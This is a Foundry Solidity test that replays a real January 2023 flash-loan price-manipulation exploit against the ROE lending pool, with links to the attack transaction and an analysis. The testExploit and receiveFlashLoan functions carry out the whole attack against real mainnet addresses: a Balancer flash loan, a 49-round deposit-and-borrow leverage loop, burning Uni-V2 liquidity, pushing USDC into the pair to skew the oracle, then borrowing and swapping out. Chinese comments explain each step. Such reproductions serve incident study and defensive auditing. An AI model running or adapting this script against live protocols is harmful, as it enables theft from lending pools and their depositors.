// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : 80K US$
// Time : 2023-01-12

// @Analysis
// https://twitter.com/BlockSecTeam/status/1613267000913960976
// @TX
// https://etherscan.io/tx/0x927b784148b60d5233e57287671cdf67d38e3e69e5b6d0ecacc7c1aeaa98985b
// @Phalcon View
// https://explorer.phalcon.xyz/tx/eth/0x927b784148b60d5233e57287671cdf67d38e3e69e5b6d0ecacc7c1aeaa98985b

// Root cause : FlashLoan price manipulation
// Cause is the limited liquidity of the pool,manipulating the price oracle to make a typical price manipulation attack.

// Token ROE Interface
interface ROE {
    function deposit(
        address asset,
        uint256 amount,
        address onBehalfOf,
        uint16 referralCode
    ) external;

    function borrow(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        uint16 referralCode,
        address onBehalfOf
    ) external;
}

interface vdWBTC_USDC_LP {
    function approveDelegation(address delegatee, uint256 amount) external;
}

contract Attacker is Test {
    IBalancerVault balancer =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    // 受害池
    ROE roe = ROE(0x5F360c6b7B25DfBfA4F10039ea0F7ecfB9B02E60);
    // Uni_Pair_V2: https://etherscan.io/address/0x004375dff511095cc5a197a54140a24efef3a416
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x004375Dff511095CC5A197A54140a24eFEF3A416);
    Uni_Router_V2 Router =
        Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    vdWBTC_USDC_LP LP =
        vdWBTC_USDC_LP(0xcae229361B554CEF5D1b4c489a75a53b4f4C9C24);
    IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 roeUSDC = IERC20(0x9C435589f24257b19219ba1563e3c0D8699F27E9);
    IERC20 vdUSDC = IERC20(0x26cd328E7C96c53BD6CAA6067e08d792aCd92e4E);
    address roeWBTC_USDC_LP = 0x68B26dCF21180D2A8DE5A303F8cC5b14c8d99c4c;
    uint flashLoanAmount = 5_673_090_338_021;

    CheatCodes constant cheat =
        CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheat.createSelectFork("mainnet", 16384469);
        cheat.label(address(roe), "ROE");
        cheat.label(address(USDC), "USDC");
        cheat.label(address(WBTC), "WBTC");
        cheat.label(address(Pair), "Uni-Pair");
    }

    // 发起攻击
    function testExploit() public {
        // 自动将msg.sender设置为后续调用的输入地址,直到stopPrank()为止
        // tx.origin是foundry中默认的地址: 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38
        cheat.startPrank(address(tx.origin));
        LP.approveDelegation(address(this), type(uint).max);
        cheat.stopPrank();

        // 检查攻击前的USDC余额
        emit log_named_decimal_uint(
            "Attacker USDC balance before exploit",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );

        address[] memory tokens = new address[](1);
        tokens[0] = address(USDC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashLoanAmount;
        bytes memory userData = "";
        // 在balancer闪电贷USDC,并触发回调函数,发起攻击
        balancer.flashLoan(address(this), tokens, amounts, userData);

        // 检查攻击后的USDC余额
        emit log_named_decimal_uint(
            "Attacker USDC balance after exploit",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );
    }

    // 回调函数,收到闪电贷时调用
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) public {
        // 将roeWBTC_USDC_LP池子中的中有的Uni-V2(主要是WBTC和USD)价值作为借贷数目
        uint borrowAmount = Pair.balanceOf(roeWBTC_USDC_LP);
        USDC.approve(address(roe), type(uint).max);
        Pair.approve(address(roe), type(uint).max);
        // 存入作为抵押的USDC
        roe.deposit(address(USDC), USDC.balanceOf(address(this)), tx.origin, 0);
        // 利用抵押借贷Uni-V2(注意这个借贷的债务时转给tx.origin的)
        roe.borrow(address(Pair), borrowAmount, 2, 0, tx.origin);
        // 重复以上两个步骤操作Uni-V2拉高杆杠
        for (uint i; i < 49; ++i) {
            roe.deposit(address(Pair), borrowAmount, address(this), 0);
            roe.borrow(address(Pair), borrowAmount, 2, 0, tx.origin);
        }
        // 向池子中转入Uni-V2,方便后面还贷
        Pair.transfer(address(Pair), borrowAmount);
        // 销毁池子流动性,更新储备
        Pair.burn(address(this));
        // !!!关键攻击步骤
        // 向池子转入USDC,操控价格,导致USDC价格虚低
        USDC.transfer(address(Pair), 26_025 * 1e6);
        Pair.sync();
        // 再向池子借USDC
        roe.borrow(address(USDC), flashLoanAmount, 2, 0, address(this));
        // 将WBTC换为USDC
        WBTCToUSDC();
        // USDC归还balancer上的闪电贷,over
        USDC.transfer(address(balancer), flashLoanAmount);
    }

    function WBTCToUSDC() internal {
        WBTC.approve(address(Router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(WBTC);
        path[1] = address(USDC);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBTC.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
